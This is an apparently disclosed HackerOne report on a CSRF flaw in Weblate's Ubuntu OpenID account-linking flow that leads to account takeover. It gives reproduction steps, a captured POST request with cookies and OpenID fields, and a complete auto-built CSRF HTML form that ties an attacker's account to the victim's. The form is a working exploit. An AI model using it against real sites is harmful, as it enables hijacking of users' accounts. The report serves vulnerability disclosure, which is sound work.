# Account Takeover using Third party Auth CSRF

## Report Details
- **Report ID**: 225653
- **URL**: https://hackerone.com/reports/225653
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-05-02T19:54:57.691Z
- **Disclosed**: 2017-05-17T14:07:17.521Z

## Reporter
- **Username**: ansariosama
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: weblate

## Vulnerability Information
1. Login to your account at demo.weblate.org

2. Goto Profile > Authentication - https://demo.weblate.org/accounts/profile/#auth

3. In Add new association section , select Ubuntu

4. Login with Ubuntu One account , before clicking on Yes log me in on ubuntu authentication site , start a proxy tool like Burp and intercept the request.

5. The request would be :

```

POST /accounts/complete/ubuntu/?janrain_nonce=2017-05-02T19%3A47%3A45ZkdmI4F HTTP/1.1
Host: demo.weblate.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 2220
Referer: https://login.ubuntu.com/uW1m5KmjuwAMvIwi/+decide
Cookie: csrftoken=nbSwWGtUEwxuG762mQJ4557CgzYRZsudxi905w4bkZCba4DnCPmgTVmNqdZnjgCb; sessionid=vpmznk0j91poy3bm9d4xqnb41f3dan35; django_language=en
Connection: close
Upgrade-Insecure-Requests: 1
openid.usernamesecret=&openid.response_nonce=2017-05-02T19%3A47%3A55ZGFIdhB&openid.ax.count.old_email=0&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.signed=assoc_handle%2Cax.count.email%2Cax.count.first_name%2Cax.count.fullname%2Cax.count.last_name%2Cax.count.nickname%2Cax.count.old_email%2Cax.count.old_fullname%2Cax.count.old_nickname%2Cax.mode%2Cax.type.email%2Cax.type.first_name%2Cax.type.fullname%2Cax.type.last_name%2Cax.type.nickname%2Cax.type.old_email%2Cax.type.old_fullname%2Cax.type.old_nickname%2Cax.value.email.1%2Cax.value.fullname.1%2Cax.value.nickname.1%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cns.ax%2Cns.sreg%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned&openid.ax.count.email=1&openid.op_endpoint=https%3A%2F%2Flogin.ubuntu.com%2F%2Bopenid&openid.ax.count.old_nickname=0&openid.ax.count.nickname=1&openid.ax.count.first_name=0&openid.ax.value.fullname.1=Osama+Ansari%22%3E%3CS%3Eaa&openid.ax.value.nickname.1=ansariosama10&openid.identity=https%3A%2F%2Flogin.ubuntu.com%2F%2Bid%2Fs3ssmQc&openid.ax.type.last_name=http%3A%2F%2Faxschema.org%2FnamePerson%2Flast&openid.return_to=https%3A%2F%2Fdemo.weblate.org%2Faccounts%2Fcomplete%2Fubuntu%2F%3Fjanrain_nonce%3D2017-05-02T19%253A47%253A45ZkdmI4F&openid.ax.count.old_fullname=0&openid.ax.mode=fetch_response&openid.claimed_id=https%3A%2F%2Flogin.ubuntu.com%2F%2Bid%2Fs3ssmQc&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.count.fullname=1&openid.ax.type.old_fullname=http%3A%2F%2Fschema.openid.net%2FnamePerson&openid.mode=id_res&openid.ax.value.email.1=ansariosama_10%40yahoo.com&openid.sig=yJVxzHLjZGTFMbnRdmCie5wlfXM%3D&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ax.count.last_name=0&openid.ax.type.first_name=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffirst&openid.ax.type.old_email=http%3A%2F%2Fschema.openid.net%2Fcontact%2Femail&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.ax.type.old_nickname=http%3A%2F%2Fschema.openid.net%2FnamePerson%2Ffriendly&openid.assoc_handle=%7BHMAC-SHA1%7D%7B58ff93b7%7D%7BNV6M%2Bw%3D%3D%7D

```

6. Drop the request and Create a CSRF Form of the request and send it to the victim.

```
<html>
  <body>
    <form action="https://demo.weblate.org/accounts/complete/ubuntu/?janrain_nonce=2017-05-02T19%3A42%3A15ZmPYI5n" method="POST">
      <input type="hidden" name="openid&#46;usernamesecret" value="" />
      <input type="hidden" name="openid&#46;response&#95;nonce" value="2017&#45;05&#45;02T19&#58;45&#58;57ZW2aGkl" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;old&#95;email" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;email" value="http&#58;&#47;&#47;axschema&#46;org&#47;contact&#47;email" />
      <input type="hidden" name="openid&#46;ns&#46;sreg" value="http&#58;&#47;&#47;openid&#46;net&#47;extensions&#47;sreg&#47;1&#46;1" />
      <input type="hidden" name="openid&#46;signed" value="assoc&#95;handle&#44;ax&#46;count&#46;email&#44;ax&#46;count&#46;first&#95;name&#44;ax&#46;count&#46;fullname&#44;ax&#46;count&#46;last&#95;name&#44;ax&#46;count&#46;nickname&#44;ax&#46;count&#46;old&#95;email&#44;ax&#46;count&#46;old&#95;fullname&#44;ax&#46;count&#46;old&#95;nickname&#44;ax&#46;mode&#44;ax&#46;type&#46;email&#44;ax&#46;type&#46;first&#95;name&#44;ax&#46;type&#46;fullname&#44;ax&#46;type&#46;last&#95;name&#44;ax&#46;type&#46;nickname&#44;ax&#46;type&#46;old&#95;email&#44;ax&#46;type&#46;old&#95;fullname&#44;ax&#46;type&#46;old&#95;nickname&#44;ax&#46;value&#46;email&#46;1&#44;ax&#46;value&#46;fullname&#46;1&#44;ax&#46;value&#46;nickname&#46;1&#44;claimed&#95;id&#44;identity&#44;mode&#44;ns&#44;ns&#46;ax&#44;ns&#46;sreg&#44;op&#95;endpoint&#44;response&#95;nonce&#44;return&#95;to&#44;signed" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;email" value="1" />
      <input type="hidden" name="openid&#46;op&#95;endpoint" value="https&#58;&#47;&#47;login&#46;ubuntu&#46;com&#47;&#43;openid" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;old&#95;nickname" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;nickname" value="1" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;first&#95;name" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;value&#46;fullname&#46;1" value="Osama&#32;Ansari&quot;&gt;&lt;S&gt;aa" />
      <input type="hidden" name="openid&#46;ax&#46;value&#46;nickname&#46;1" value="ansariosama10" />
      <input type="hidden" name="openid&#46;identity" value="https&#58;&#47;&#47;login&#46;ubuntu&#46;com&#47;&#43;id&#47;s3ssmQc" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;last&#95;name" value="http&#58;&#47;&#47;axschema&#46;org&#47;namePerson&#47;last" />
      <input type="hidden" name="openid&#46;return&#95;to" value="https&#58;&#47;&#47;demo&#46;weblate&#46;org&#47;accounts&#47;complete&#47;ubuntu&#47;&#63;janrain&#95;nonce&#61;2017&#45;05&#45;02T19&#37;3A42&#37;3A15ZmPYI5n" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;old&#95;fullname" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;mode" value="fetch&#95;response" />
      <input type="hidden" name="openid&#46;claimed&#95;id" value="https&#58;&#47;&#47;login&#46;ubuntu&#46;com&#47;&#43;id&#47;s3ssmQc" />
      <input type="hidden" name="openid&#46;ns&#46;ax" value="http&#58;&#47;&#47;openid&#46;net&#47;srv&#47;ax&#47;1&#46;0" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;fullname" value="1" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;old&#95;fullname" value="http&#58;&#47;&#47;schema&#46;openid&#46;net&#47;namePerson" />
      <input type="hidden" name="openid&#46;mode" value="id&#95;res" />
      <input type="hidden" name="openid&#46;ax&#46;value&#46;email&#46;1" value="ansariosama&#95;10&#64;yahoo&#46;com" />
      <input type="hidden" name="openid&#46;sig" value="C&#47;7&#47;y31yiyg6crJkuA4P34LKed0&#61;" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;fullname" value="http&#58;&#47;&#47;axschema&#46;org&#47;namePerson" />
      <input type="hidden" name="openid&#46;ns" value="http&#58;&#47;&#47;specs&#46;openid&#46;net&#47;auth&#47;2&#46;0" />
      <input type="hidden" name="openid&#46;ax&#46;count&#46;last&#95;name" value="0" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;first&#95;name" value="http&#58;&#47;&#47;axschema&#46;org&#47;namePerson&#47;first" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;old&#95;email" value="http&#58;&#47;&#47;schema&#46;openid&#46;net&#47;contact&#47;email" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;nickname" value="http&#58;&#47;&#47;axschema&#46;org&#47;namePerson&#47;friendly" />
      <input type="hidden" name="openid&#46;ax&#46;type&#46;old&#95;nickname" value="http&#58;&#47;&#47;schema&#46;openid&#46;net&#47;namePerson&#47;friendly" />
      <input type="hidden" name="openid&#46;assoc&#95;handle" value="&#123;HMAC&#45;SHA1&#125;&#123;58ff93b7&#125;&#123;NV6M&#43;w&#61;&#61;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

7. Attacker's Ubuntu account will be connected to victim , the attacker can then use login with Ubuntu and access victim's account.

## Attachments
No attachments
